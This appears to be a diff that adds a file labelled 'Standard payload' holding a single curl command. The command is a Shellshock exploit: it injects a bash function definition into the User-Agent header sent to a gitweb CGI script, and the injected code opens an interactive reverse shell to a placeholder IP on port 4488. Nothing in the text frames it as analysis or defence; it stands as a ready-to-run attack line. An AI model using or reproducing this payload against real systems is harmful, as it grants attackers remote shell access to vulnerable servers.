@@ -1,0 +1,4 @@
+Standard payload
+curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/IP/4488 0>&1" http://IP/cgi-bin/gitweb.cgi
+
+
